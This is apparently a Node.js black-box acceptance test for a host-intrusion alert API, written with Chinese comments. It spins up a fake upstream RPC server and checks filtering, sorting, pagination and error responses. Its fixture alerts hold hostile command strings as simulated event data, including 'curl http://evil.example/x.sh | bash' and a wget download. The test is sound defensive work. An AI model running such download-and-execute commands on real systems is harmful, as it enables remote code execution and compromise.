// P003-T001 黑盒验收探针（何东阳 / gc-backend-tester）
// 判据全部来自 docs/openapi.yaml 与 docs/modules/*.md；不读实现代码，不 import 产品模块。
// 结构：假牧云 /rpc 上游（HTTP） + 真实 `node server.js` 子进程 + 真实 HTTP 请求。
// 用法：在工作树根目录 `node evidence/p003-t001-api/checks.mjs [--phase=a|b|all]`
// 所有子进程与临时目录在退出时回收（含 SIGINT / 异常路径）。
import http from 'node:http';
import net from 'node:net';
import path from 'node:path';
import { spawn, execFileSync } from 'node:child_process';
import { setTimeout as sleep } from 'node:timers/promises';
import { mkdtempSync, rmSync, cpSync } from 'node:fs';
import { tmpdir } from 'node:os';

const REPO = process.cwd();
const PHASE = (process.argv.find(a => a.startsWith('--phase=')) || '--phase=all').slice(8);

/* ---------------- 结果台账 ---------------- */
const results = [];
function check(id, name, fn) {
  try {
    const detail = fn();
    results.push({ id, name, ok: true, detail });
    console.log(`ok   ${id} ${name} ${detail ? '| ' + detail : ''}`);
  } catch (e) {
    results.push({ id, name, ok: false, detail: e.message });
    console.log(`FAIL ${id} ${name} | ${e.message}`);
  }
}
async function checkAsync(id, name, fn) {
  try {
    const detail = await fn();
    results.push({ id, name, ok: true, detail });
    console.log(`ok   ${id} ${name} ${detail ? '| ' + detail : ''}`);
  } catch (e) {
    results.push({ id, name, ok: false, detail: e.message });
    console.log(`FAIL ${id} ${name} | ${e.message}`);
  }
}
function eq(actual, expected, what) {
  // 对象按键排序后比较：字段顺序不属于契约
  const canon = (v) => (v && typeof v === 'object' && !Array.isArray(v))
    ? '{' + Object.keys(v).sort().map((k) => JSON.stringify(k) + ':' + canon(v[k])).join(',') + '}'
    : JSON.stringify(v);
  const a = canon(actual), b = canon(expected);
  if (a !== b) throw new Error(`${what}: 期望 ${b} 实测 ${a}`);
}

/* ---------------- 假牧云上游（按文档第 4/6/7 节造数） ---------------- */
const t = (iso) => iso; // 时间字段直接用 ISO 串，文档 6.2：数值或字符串都收
const row = (o) => ({
  event_name: o.title,
  detected_at: o.at ?? undefined,
  created_at: o.at ?? undefined,
  level: o.level,
  host: { host_name: o.asset, host_ip: o.ip },
  host_name: o.asset,
  username: o.account ?? 'svc',
  cmdline: o.command ?? 'true',
  source_ip: o.source ?? '203.0.113.9',
  destination_ip: o.target ?? '10.0.0.1',
  ...(o.id !== undefined ? { id: o.id } : {}),
});
const FIXTURES = {
  webshell: [
    { id: 1, at: '2026-11-01T08:00:00Z', level: 4, title: 'WebShell 落地', asset: 'db-1', ip: '10.0.0.1', account: 'root', command: 'curl http://evil.example/x.sh | bash', source: '203.0.113.9' },
    { id: 2, at: '2026-11-01T09:00:00Z', level: 2, title: '可疑上传', asset: 'web-2', ip: '10.0.0.2', account: 'www-data', command: 'upload.jsp', source: '198.51.100.7' },
    { id: 3, at: '2026-11-01T07:00:00Z', level: 3, title: 'WebShell 回连', asset: 'db-1', ip: '10.0.0.1', account: 'root', command: 'python -c REVERSE shell', source: '203.0.113.9' },
  ],
  malware: [
    { id: 5, at: '2026-11-01T10:00:00Z', level: 3, title: '恶意文件落地', asset: 'app-3', ip: '10.0.0.3', account: 'svc', command: '/tmp/x.sh', source: '192.0.2.5' },
    { id: 6, at: '2026-10-30T10:00:00Z', level: 1, title: '可疑脚本', asset: 'app-3', ip: '10.0.0.3', account: 'svc', command: 'sh y.sh', source: '192.0.2.5' },
  ],
  honeypot: [
    { id: 4, at: null, level: 1, title: '蜜罐命中', asset: 'honeypot-1', ip: '10.0.0.9', account: 'root', command: 'wget http://192.0.2.9/z', source: '192.0.2.9' },
  ],
};
for (const k of ['revshell', 'memory_webshell', 'brute_force', 'abnormal_login', 'elevation_process', 'network_audit', 'suspicious_operation', 'memory_security']) FIXTURES[k] = [];

// 600 条造数：时间随 id 递增，等级 1..4 按 id%4 循环（文档 7.2：本地按时间倒序排）
const BIG = Array.from({ length: 600 }, (_, i) => ({
  id: i + 1,
  at: new Date(Date.UTC(2026, 2, 1) + (i + 1) * 60000).toISOString(),
  level: [1, 2, 3, 4][i % 4],
  title: `大库事件 ${i + 1}`,
  asset: 'bulk-host',
  ip: '10.1.0.1',
  account: 'svc',
  command: 'bulk',
  source: '203.0.113.50',
  target: '10.1.0.1',
}));

const METHOD = {
  webshell: 'WebshellEventService.GetEventList',
  malware: 'MalwareEventService.GetEventList',
  revshell: 'RevshellEventService.GetEventList',
  memory_webshell: 'MemoryWebshellEventService.GetEventList',
  brute_force: 'BruteForceService.GetEventList',
  abnormal_login: 'AbnormalLoginEventService.GetEventList',
  elevation_process: 'ElevationProcessEventService.GetEventList',
  network_audit: 'NetworkAuditEventService.GetEventList',
  suspicious_operation: 'SuspiciousOperationService.GetEventList',
  honeypot: 'HoneypotService.List',
  memory_security: 'MemorySecurityEventService.GetEventList',
};
const TYPE_OF = Object.fromEntries(Object.entries(METHOD).map(([k, v]) => [v, k]));

const RAW = Object.fromEntries(Object.entries(FIXTURES).map(([k, rows]) => [k, rows.map(row)]));
const RAW_BIG = BIG.map(row);
const upstream = { mode: 'normal', data: RAW, calls: [] };
function startUpstream() {
  const srv = http.createServer((req, res) => {
    const method = new URL(req.url, 'http://x').searchParams.get('method');
    upstream.calls.push(method);
    const type = TYPE_OF[method];
    const send = (status, body) => { res.writeHead(status, { 'content-type': 'application/json' }); res.end(JSON.stringify(body)); };
    if (!type) return send(200, { jsonrpc: '2.0', id: 1, error: { code: -32601, message: `未知方法 ${method}` } });
    if (upstream.mode === 'failAll') return send(500, { jsonrpc: '2.0', id: 1, error: { code: -32000, message: '牧云内部错误' } });
    if (upstream.mode === 'failOne' && type === 'webshell') return send(500, { jsonrpc: '2.0', id: 1, error: { code: -32000, message: 'webshell 服务不可用' } });
    let body = '';
    req.on('data', (c) => { body += c; });
    req.on('end', () => {
      let params = {};
      try { params = JSON.parse(body).params || {}; } catch { /* 空 */ }
      const rows = upstream.data[type] || [];
      const count = Number(params.count) || 20, offset = Number(params.offset) || 0;
      send(200, { jsonrpc: '2.0', id: 1, result: { events: rows.slice(offset, offset + count), total: rows.length } });
    });
  });
  return new Promise((resolve) => srv.listen(0, '127.0.0.1', () => resolve({ srv, port: srv.address().port })));
}

/* ---------------- 真 server.js 子进程 ---------------- */
function freePort() {
  return new Promise((resolve, reject) => {
    const s = net.createServer();
    s.listen(0, '127.0.0.1', () => { const p = s.address().port; s.close(() => resolve(p)); });
    s.on('error', reject);
  });
}
const children = new Set();
async function startApi({ cwd = REPO, port, rpcPort, extraEnv = {} }) {
  const env = {
    PATH: process.env.PATH, HOME: process.env.HOME,
    HIDS_HOST: '127.0.0.1', HIDS_PORT: String(port),
    HIDS_BASIC_AUTH_USER: 'hids', HIDS_BASIC_AUTH_PASSWORD: 's3cret',
    ...(rpcPort ? { CLOUDWALKER_URL: `http://127.0.0.1:${rpcPort}`, CLOUDWALKER_API_TOKEN: 'token-abcdef' } : { CLOUDWALKER_URL: '', CLOUDWALKER_API_TOKEN: '' }),
    ...extraEnv,
  };
  const child = spawn(process.execPath, ['server.js'], { cwd, env, stdio: ['ignore', 'pipe', 'pipe'] });
  children.add(child);
  let out = '';
  child.stdout.on('data', (c) => { out += c; });
  child.stderr.on('data', (c) => { out += c; });
  child.on('exit', () => children.delete(child));
  const deadline = Date.now() + 15000;
  while (Date.now() < deadline) {
    try {
      const r = await fetch(`http://127.0.0.1:${port}/api/session`, { signal: AbortSignal.timeout(1000), headers: authHeader() });
      if (r.status === 200) return { child, log: () => out };
    } catch { /* 还没起来 */ }
    await sleep(100);
  }
  child.kill('SIGKILL');
  throw new Error(`server.js 未在 15s 内就绪；输出：${out.slice(0, 800)}`);
}
function authHeader() {
  return { authorization: 'Basic ' + Buffer.from('hids:s3cret').toString('base64') };
}
async function stop(child) {
  if (!child || child.exitCode !== null) return;
  child.kill('SIGTERM');
  const deadline = Date.now() + 3000;
  while (child.exitCode === null && Date.now() < deadline) await sleep(50);
  if (child.exitCode === null) child.kill('SIGKILL');
}

let BASE = '';
async function req(pathq, init = {}) {
  const r = await fetch(BASE + pathq, {
    ...init,
    signal: AbortSignal.timeout(20000),
    headers: { ...authHeader(), ...(init.headers || {}) },
  });
  const text = await r.text();
  let json = null;
  try { json = JSON.parse(text); } catch { /* 非 JSON */ }
  return { status: r.status, headers: Object.fromEntries(r.headers), text, json };
}
const ids = (b) => (b.alerts || []).map((a) => a.id);
const onlyIds = (b) => b.alerts.map((a) => a.id);

function expectOk(r, what) {
  if (r.status !== 200) throw new Error(`${what}: 期望 200 实测 ${r.status} ${r.text.slice(0, 200)}`);
  if (!/application\/json/.test(r.headers['content-type'] || '')) throw new Error(`${what}: content-type=${r.headers['content-type']}`);
  return r.json;
}
function expect400(r, what) {
  if (r.status !== 400) throw new Error(`${what}: 期望 400 实测 ${r.status} ${r.text.slice(0, 200)}`);
  if (!r.json || typeof r.json.error !== 'string' || !r.json.error) throw new Error(`${what}: 400 正文不是 {error:string}：${r.text.slice(0, 200)}`);
  return r.json.error;
}

/* ---------------- schema 符合性（照 openapi.yaml Alert / 200 响应） ---------------- */
const LEVEL_KEYS = ['low', 'medium', 'high', 'critical', 'unknown'];
function assertEnvelope(b, what) {
  for (const k of ['alerts', 'total', 'totals', 'errors', 'partial']) if (!(k in b)) throw new Error(`${what}: 响应缺必填字段 ${k}`);
  if (!Array.isArray(b.alerts)) throw new Error(`${what}: alerts 不是数组`);
  if (!Number.isInteger(b.total)) throw new Error(`${what}: total 不是整数`);
  if (typeof b.totals !== 'object' || b.totals === null || Array.isArray(b.totals)) throw new Error(`${what}: totals 不是对象`);
  for (const [k, v] of Object.entries(b.totals)) if (!Number.isInteger(v)) throw new Error(`${what}: totals.${k} 不是整数`);
  if (typeof b.errors !== 'object' || b.errors === null) throw new Error(`${what}: errors 不是对象`);
  for (const [k, v] of Object.entries(b.errors)) if (typeof v !== 'string') throw new Error(`${what}: errors.${k} 不是字符串`);
  if (typeof b.partial !== 'boolean') throw new Error(`${what}: partial 不是布尔`);
  if ('truncated' in b && typeof b.truncated !== 'boolean') throw new Error(`${what}: truncated 不是布尔（${typeof b.truncated}）`);
  b.alerts.forEach((a, i) => {
    if (typeof a.id !== 'string' || !/^[a-z_]+:[1-9][0-9]*$/.test(a.id)) throw new Error(`${what}: alerts[${i}].id 不匹配 TypedAlertId：${a.id}`);
    if (!(typeof a.createdAt === 'string' || a.createdAt === null)) throw new Error(`${what}: alerts[${i}].createdAt 类型不符`);
    if (!LEVEL_KEYS.includes(a.levelKey)) throw new Error(`${what}: alerts[${i}].levelKey 不在枚举：${a.levelKey}`);
    if (typeof a.verdict !== 'string') throw new Error(`${what}: alerts[${i}].verdict 不是字符串`);
    if (typeof a.verdictKey !== 'string') throw new Error(`${what}: alerts[${i}].verdictKey 不是字符串`);
    if ('triage' in a && !(a.triage === null || typeof a.triage === 'object')) throw new Error(`${what}: alerts[${i}].triage 既不是 null 也不是对象`);
    if (a.triage && (typeof a.triage.alert_id !== 'string' || typeof a.triage.status !== 'string')) throw new Error(`${what}: alerts[${i}].triage 缺 alert_id/status`);
  });
  return b;
}

/* ---------------- 阶段 A：真树 + 假牧云 ---------------- */
async function phaseA(upperPort) {
  const apiPort = await freePort();
  BASE = `http://127.0.0.1:${apiPort}`;
  const api = await startApi({ port: apiPort, rpcPort: upperPort });
  const per = async (pathq) => { upstream.calls = []; const r = await req(pathq); r.rpcCalls = [...upstream.calls]; return r; };
  try {
    // ---- A1 type 下推 ----
    await checkAsync('A1', 'type=webshell 只查该类：total/totals 只含该类且上游只发 1 个 RPC', async () => {
      const r = await per('/api/alerts?type=webshell');
      const b = assertEnvelope(expectOk(r, 'A1'), 'A1');
      eq(onlyIds(b), ['webshell:2', 'webshell:1', 'webshell:3'], 'A1 ids（时间倒序）');
      eq(b.total, 3, 'A1 total');
      eq(b.totals, { webshell: 3 }, 'A1 totals');
      eq([...new Set(r.rpcCalls)], ['WebshellEventService.GetEventList'], 'A1 上游方法（下推证明）');
      return `ids=${onlyIds(b)} total=${b.total} rpc=${r.rpcCalls.length}×webshell`;
    });
    await checkAsync('A1b', 'type=revshell（该类 0 条）→ 200、alerts=[]、total=0、totals 只含该类', async () => {
      const r = await per('/api/alerts?type=revshell');
      const b = assertEnvelope(expectOk(r, 'A1b'), 'A1b');
      eq(b.alerts, [], 'A1b alerts'); eq(b.total, 0, 'A1b total'); eq(b.totals, { revshell: 0 }, 'A1b totals');
      eq([...new Set(r.rpcCalls)], ['RevshellEventService.GetEventList'], 'A1b 上游方法');
      return 'total=0';
    });

    // ---- A2 level / q / from / to 过滤后切页 ----
    await checkAsync('A2a', 'level=high,critical 合并后过滤，total=3', async () => {
      const b = assertEnvelope(expectOk(await req('/api/alerts?level=high,critical'), 'A2a'), 'A2a');
      eq(onlyIds(b), ['malware:5', 'webshell:1', 'webshell:3'], 'A2a ids');
      eq(b.total, 3, 'A2a total');
      return `ids=${onlyIds(b)}`;
    });
    await checkAsync('A2b', 'level=3,4（数字写法）与 level=high,critical 等价', async () => {
      const num = assertEnvelope(expectOk(await req('/api/alerts?level=3,4'), 'A2b'), 'A2b');
      const key = assertEnvelope(expectOk(await req('/api/alerts?level=high,critical'), 'A2b2'), 'A2b2');
      eq(onlyIds(num), onlyIds(key), 'A2b 数字/键名等价 ids'); eq(num.total, key.total, 'A2b total');
      return `ids=${onlyIds(num)}`;
    });
    await checkAsync('A2c', '过滤后切页：level=high,critical&count=1&offset=1 → 第 2 页、total 不变', async () => {
      const b = assertEnvelope(expectOk(await req('/api/alerts?level=high,critical&count=1&offset=1'), 'A2c'), 'A2c');
      eq(onlyIds(b), ['webshell:1'], 'A2c 第二页'); eq(b.total, 3, 'A2c total');
      return 'page2=[webshell:1] total=3';
    });
    await checkAsync('A2d', 'from/to 闭区间：from=08:00&to=09:00 两端都含', async () => {
      const b = assertEnvelope(expectOk(await req('/api/alerts?from=2026-11-01T08:00:00Z&to=2026-11-01T09:00:00Z'), 'A2d'), 'A2d');
      eq(onlyIds(b), ['webshell:2', 'webshell:1'], 'A2d ids'); eq(b.total, 2, 'A2d total');
      return 'ids=[webshell:2,webshell:1]';
    });
    await checkAsync('A2e', '无事件时间的告警在带时间筛选时被排除（honeypot:4）', async () => {
      const all = assertEnvelope(expectOk(await req('/api/alerts?type=honeypot'), 'A2e-all'), 'A2e-all');
      eq(all.total, 1, 'A2e 不带时间筛选时 total');
      eq(all.alerts[0].createdAt, null, 'A2e createdAt 应为 null');
      const filtered = assertEnvelope(expectOk(await req('/api/alerts?type=honeypot&from=1970-01-01T00:00:00Z'), 'A2e-f'), 'A2e-f');
      eq(filtered.total, 0, 'A2e 带 from 时 total');
      return 'unfiltered=1, from 后=0';
    });
    await checkAsync('A2f', 'q 大小写不敏感（q=REVERSE 命中 cmdline）', async () => {
      const b = assertEnvelope(expectOk(await req('/api/alerts?q=REVERSE'), 'A2f'), 'A2f');
      eq(onlyIds(b), ['webshell:3'], 'A2f ids'); eq(b.total, 1, 'A2f total');
      return 'ids=[webshell:3]';
    });
    await checkAsync('A2g', 'q 命中 asset + type 下推组合：?type=webshell&q=db-1 → 2', async () => {
      const b = assertEnvelope(expectOk(await req('/api/alerts?type=webshell&q=db-1'), 'A2g'), 'A2g');
      eq(onlyIds(b), ['webshell:1', 'webshell:3'], 'A2g ids'); eq(b.total, 2, 'A2g total');
      return 'ids=[webshell:1,webshell:3]';
    });
    await checkAsync('A2h', 'from 用秒级时间戳与 RFC3339 等价', async () => {
      const sec = Math.floor(Date.parse('2026-11-01T08:00:00Z') / 1000);
      const a = assertEnvelope(expectOk(await req(`/api/alerts?from=${sec}`), 'A2h-sec'), 'A2h-sec');
      const b = assertEnvelope(expectOk(await req('/api/alerts?from=2026-11-01T08:00:00Z'), 'A2h-rfc'), 'A2h-rfc');
      eq(onlyIds(a), onlyIds(b), 'A2h ids'); eq(a.total, b.total, 'A2h total'); eq(b.total, 3, 'A2h 期望条数');
      return `total=${a.total}`;
    });

    // ---- A4 sort 与无参回归 ----
    await checkAsync('A4a', '无参数：total = 各类 total 之和(6)，时间倒序，末位是无时间那条', async () => {
      const b = assertEnvelope(expectOk(await req('/api/alerts'), 'A4a'), 'A4a');
      eq(onlyIds(b), ['malware:5', 'webshell:2', 'webshell:1', 'webshell:3', 'malware:6', 'honeypot:4'], 'A4a ids');
      eq(b.total, 6, 'A4a total');
      eq(b.totals, { webshell: 3, malware: 2, honeypot: 1, revshell: 0, memory_webshell: 0, brute_force: 0, abnormal_login: 0, elevation_process: 0, network_audit: 0, suspicious_operation: 0, memory_security: 0 }, 'A4a totals');
      eq(b.partial, false, 'A4a partial'); eq(b.errors, {}, 'A4a errors');
      return 'total=6 totals 11 类';
    });
    await checkAsync('A4b', 'sort=time 与不带 sort 逐字段相同（alerts/total/totals/errors/partial/truncated）', async () => {
      const a = assertEnvelope(expectOk(await req('/api/alerts?count=20&offset=0'), 'A4b-a'), 'A4b-a');
      const b = assertEnvelope(expectOk(await req('/api/alerts?count=20&offset=0&sort=time'), 'A4b-b'), 'A4b-b');
      for (const k of ['alerts', 'total', 'totals', 'errors', 'partial']) eq(b[k], a[k], `A4b ${k}`);
      eq(b.truncated ?? false, a.truncated ?? false, 'A4b truncated');
      return '六项全等';
    });
    await checkAsync('A4c', 'sort=level：等级降序、同级按时间倒序', async () => {
      const b = assertEnvelope(expectOk(await req('/api/alerts?sort=level'), 'A4c'), 'A4c');
      eq(onlyIds(b), ['webshell:1', 'malware:5', 'webshell:3', 'webshell:2', 'malware:6', 'honeypot:4'], 'A4c ids');
      eq(b.total, 6, 'A4c total');
      return `ids=${onlyIds(b)}`;
    });
    await checkAsync('A4d', 'sort=level&level=high,critical 组合', async () => {
      const b = assertEnvelope(expectOk(await req('/api/alerts?sort=level&level=high,critical'), 'A4d'), 'A4d');
      eq(onlyIds(b), ['webshell:1', 'malware:5', 'webshell:3'], 'A4d ids'); eq(b.total, 3, 'A4d total');
      return `ids=${onlyIds(b)}`;
    });
    await checkAsync('A4e', '分页形状不变：count=2&offset=1 → 第 2、3 条，total 仍是全量 6', async () => {
      const b = assertEnvelope(expectOk(await req('/api/alerts?count=2&offset=1'), 'A4e'), 'A4e');
      eq(onlyIds(b), ['webshell:2', 'webshell:1'], 'A4e ids'); eq(b.total, 6, 'A4e total');
      return 'ids 正确 total=6';
    });
    await checkAsync('A4f', 'offset 超出总数 → 200 + alerts=[] + total 不变', async () => {
      const b = assertEnvelope(expectOk(await req('/api/alerts?count=50&offset=100'), 'A4f'), 'A4f');
      eq(b.alerts, [], 'A4f alerts'); eq(b.total, 6, 'A4f total');
      return 'alerts=[]';
    });

    // ---- 扫描窗口与 truncated（文档：最多扫 500 条，越界 truncated=true） ----
    await checkAsync('S1', '大库 600 条 + level=critical：truncated=true，total 只算扫描窗口内匹配(125)', async () => {
      upstream.data = { ...RAW, webshell: RAW_BIG };
      try {
        const b = assertEnvelope(expectOk(await req('/api/alerts?type=webshell&level=critical&count=5'), 'S1'), 'S1');
        eq(b.truncated, true, 'S1 truncated');
        eq(b.total, 125, 'S1 total（窗口 500 内 level=4 条数）');
        eq(b.alerts.length, 5, 'S1 页长');
        const scanWindow = BIG.slice(100).map((r) => `webshell:${r.id}`);
        for (const a of b.alerts) if (!scanWindow.includes(a.id)) throw new Error(`S1 返回了窗口外条目 ${a.id}`);
        return 'truncated=true total=125';
      } finally { upstream.data = RAW; }
    });
    await checkAsync('S2', '大库 + 过滤后跨页：offset=100 → 页长 25（窗口内 125 条的第 101–125 条）', async () => {
      upstream.data = { ...RAW, webshell: RAW_BIG };
      try {
        const b = assertEnvelope(expectOk(await req('/api/alerts?type=webshell&level=critical&count=50&offset=100'), 'S2'), 'S2');
        eq(b.alerts.length, 25, 'S2 页长'); eq(b.total, 125, 'S2 total');
        return '页长=25 total=125';
      } finally { upstream.data = RAW; }
    });
    await checkAsync('S3', '大库不带筛选：truncated 不为 true，total = 600（全量）', async () => {
      upstream.data = { ...RAW, webshell: RAW_BIG };
      try {
        const b = assertEnvelope(expectOk(await req('/api/alerts?type=webshell&count=5'), 'S3'), 'S3');
        eq(b.total, 600, 'S3 total'); eq(b.truncated ?? false, false, 'S3 truncated');
        return 'total=600 truncated=false';
      } finally { upstream.data = RAW; }
    });

    // ---- 边界 ----
    for (const [label, pathq] of [
      ['count=0', '/api/alerts?count=0'],
      ['count=51', '/api/alerts?count=51'],
      ['count=abc', '/api/alerts?count=abc'],
      ['count=20.5', '/api/alerts?count=20.5'],
      ['offset=-1', '/api/alerts?offset=-1'],
      ['offset=abc', '/api/alerts?offset=abc'],
    ]) {
      await checkAsync(`B-${label}`, `分页边界 ${label} → 400 且正文 {error:string}`, async () => {
        const msg = expect400(await req(pathq), label);
        return `error="${msg}"`;
      });
    }
    await checkAsync('B-q 超长', 'q 传 5000 字符 → 200、alerts=[]、不 500', async () => {
      const b = assertEnvelope(expectOk(await req('/api/alerts?q=' + 'a'.repeat(5000)), 'B-q'), 'B-q');
      eq(b.total, 0, 'B-q total');
      return 'total=0';
    });
    await checkAsync('B-q 空串', 'q= 空串 → 200（按未筛选处理，total=6）', async () => {
      const b = assertEnvelope(expectOk(await req('/api/alerts?q='), 'B-q空'), 'B-q空');
      eq(b.total, 6, 'B-q空 total');
      return 'total=6';
    });
    await checkAsync('B-count 缺省/50', 'count 缺省 20、count=50 均可（文档 http-api.md §7）', async () => {
      const a = assertEnvelope(expectOk(await req('/api/alerts'), 'B-count缺省'), 'B-count缺省');
      const b = assertEnvelope(expectOk(await req('/api/alerts?count=50'), 'B-count50'), 'B-count50');
      eq(a.alerts.length, 6, 'B-count缺省 页长'); eq(b.alerts.length, 6, 'B-count50 页长');
      return 'ok';
    });

    // ---- 无研判队列（未配 LLM_*）时研判侧筛选的口径 ----
    await checkAsync('T1', '无研判队列时 triage_status=not_queued 命中全部（openapi: 没有记录算 not_queued）', async () => {
      const b = assertEnvelope(expectOk(await req('/api/alerts?triage_status=not_queued'), 'T1'), 'T1');
      eq(b.total, 6, 'T1 total');
      return 'total=6';
    });
    await checkAsync('T2', '无研判队列时 verdict=review 命中全部、verdict=threat 一条不中（openapi: 没有结论算 review）', async () => {
      const review = assertEnvelope(expectOk(await req('/api/alerts?verdict=review'), 'T2-review'), 'T2-review');
      const threat = assertEnvelope(expectOk(await req('/api/alerts?verdict=threat'), 'T2-threat'), 'T2-threat');
      eq(review.total, 6, 'T2 review total'); eq(threat.total, 0, 'T2 threat total');
      return 'review=6 threat=0';
    });

    // ---- 错误码 ----
    for (const [label, pathq, hint] of [
      ['type=nope', '/api/alerts?type=nope', '筛选事件类型无效'],
      ['type=WebShell（大写）', '/api/alerts?type=WebShell', '筛选事件类型无效'],
      ['type 多值之一非法', '/api/alerts?type=webshell,nope', '类型'],
      ['level=9', '/api/alerts?level=9', '等级'],
      ['level=loud', '/api/alerts?level=loud', '等级'],
      ['sort=name', '/api/alerts?sort=name', '排序'],
      ['from=abc', '/api/alerts?from=abc', '起始时间'],
      ['to=abc', '/api/alerts?to=abc', '结束时间'],
      ['from>to', '/api/alerts?from=2026-11-02T00:00:00Z&to=2026-11-01T00:00:00Z', '时间'],
      ['triage_status=nope', '/api/alerts?triage_status=nope', '研判状态'],
      ['verdict=nope', '/api/alerts?verdict=nope', '结论'],
    ]) {
      await checkAsync(`E-${label}`, `非法枚举 ${label} → 400 {error}`, async () => {
        const msg = expect400(await req(pathq), label);
        return `error="${msg}"`;
      });
    }
    await checkAsync('E-level 混写', 'level=1,high（键名与序号混选）应按两段都收（openapi: 既收 levelKey 也收 1–4）', async () => {
      const r = await req('/api/alerts?level=1,high');
      const b = assertEnvelope(expectOk(r, 'E-level混写'), 'E-level混写');
      eq(onlyIds(b), ['malware:5', 'webshell:3', 'malware:6', 'honeypot:4'], 'E-level混写 ids');
      return `ids=${onlyIds(b)}`;
    });
    await checkAsync('E-401', '无凭据 → 401 纯文本（文档 http-api.md §4）', async () => {
      const r = await fetch(BASE + '/api/alerts', { signal: AbortSignal.timeout(5000) });
      if (r.status !== 401) throw new Error(`期望 401 实测 ${r.status}`);
      const ct = r.headers.get('content-type') || '';
      const body = await r.text();
      if (/application\/json/.test(ct)) throw new Error(`401 不该是 JSON：${ct}`);
      if (!body.includes('需要登录后访问')) throw new Error(`401 正文不含约定文案：${body}`);
      if (!/Basic realm=/.test(r.headers.get('www-authenticate') || '')) throw new Error('401 缺 WWW-Authenticate');
      return `401 body="${body}"`;
    });
    await checkAsync('E-部分类型失败', 'webshell RPC 失败 → 200 partial=true、errors.webshell 有值、其余类型照常', async () => {
      upstream.mode = 'failOne';
      try {
        const r = await req('/api/alerts');
        const b = assertEnvelope(expectOk(r, 'E-partial'), 'E-partial');
        eq(b.partial, true, 'E-partial partial');
        if (typeof b.errors.webshell !== 'string' || !b.errors.webshell) throw new Error(`errors.webshell 缺失：${JSON.stringify(b.errors)}`);
        eq(b.total, 3, 'E-partial 其余类型 total（malware 2 + honeypot 1）');
        eq(onlyIds(b), ['malware:5', 'malware:6', 'honeypot:4'], 'E-partial ids');
        return `errors.webshell="${b.errors.webshell}" total=3`;
      } finally { upstream.mode = 'normal'; }
    });
    await checkAsync('E-全部类型失败', '11 类 RPC 全失败 → 502 {error}', async () => {
      upstream.mode = 'failAll';
      try {
        const r = await req('/api/alerts');
        if (r.status !== 502) throw new Error(`期望 502 实测 ${r.status} ${r.text.slice(0, 200)}`);
        if (!r.json || typeof r.json.error !== 'string') throw new Error(`502 正文不是 {error:...}：${r.text.slice(0, 200)}`);
        return `502 error="${r.json.error.slice(0, 40)}…"`;
      } finally { upstream.mode = 'normal'; }
    });
    await checkAsync('E-告警详情', '/api/alerts/webshell:1 详情链路仍通（本卡未改错误的回归点）', async () => {
      const r = await req('/api/alerts/webshell:1');
      if (r.status !== 502) throw new Error(`假上游不实现 GetEvent，期望 502 实测 ${r.status} ${r.text.slice(0, 120)}`);
      if (!r.json || typeof r.json.error !== 'string') throw new Error('502 正文不是 {error}');
      return '502 {error}';
    });
  } finally {
    await stop(api.child);
  }
}

/* ---------------- 阶段 B：无牧云配置（503）与 triage 侧过滤 ---------------- */
async function phaseB() {
  // B1：无 CLOUDWALKER_URL/token → /api/alerts 503
  const p503 = await freePort();
  BASE = `http://127.0.0.1:${p503}`;
  const noEnv = await startApi({ port: p503 });
  try {
    await checkAsync('E-503', '未配 CLOUDWALKER_* → /api/alerts 503 {error}', async () => {
      const r = await req('/api/alerts');
      if (r.status !== 503) throw new Error(`期望 503 实测 ${r.status} ${r.text.slice(0, 200)}`);
      if (!r.json || typeof r.json.error !== 'string' || !r.json.error) throw new Error(`503 正文不是 {error}：${r.text.slice(0, 200)}`);
      return `error="${r.json.error}"`;
    });
    await checkAsync('E-503b', '未配 CLOUDWALKER_* 时带筛选参数也先判 503（文档：先判后端有没有配，再判分页）', async () => {
      const r = await req('/api/alerts?type=webshell&level=critical');
      if (r.status !== 503) throw new Error(`期望 503 实测 ${r.status} ${r.text.slice(0, 200)}`);
      return '503';
    });
  } finally { await stop(noEnv.child); }
}

async function main() {
  const tmp = mkdtempSync(path.join(tmpdir(), 'p003-t001-'));
  let up = null;
  try {
    if (PHASE === 'a' || PHASE === 'all') {
      up = await startUpstream();
      await phaseA(up.port);
    }
    if (PHASE === 'b' || PHASE === 'all') await phaseB();
  } finally {
    for (const c of children) { try { c.kill('SIGKILL'); } catch { /* 已退出 */ } }
    if (up) await new Promise((r) => up.srv.close(r));
    rmSync(tmp, { recursive: true, force: true });
  }
  const failed = results.filter((r) => !r.ok);
  console.log(`\n# 用例 ${results.length} / 通过 ${results.length - failed.length} / 失败 ${failed.length}`);
  if (failed.length) {
    for (const f of failed) console.log(`FAILED: ${f.id} ${f.name} :: ${f.detail}`);
    process.exitCode = 1;
  } else {
    console.log('全部通过');
  }
}

process.on('SIGINT', () => { for (const c of children) { try { c.kill('SIGKILL'); } catch { /* 已退出 */ } } process.exit(130); });
main().catch((e) => { console.error('HARNESS ERROR', e); for (const c of children) { try { c.kill('SIGKILL'); } catch { /* 已退出 */ } } process.exit(2); });
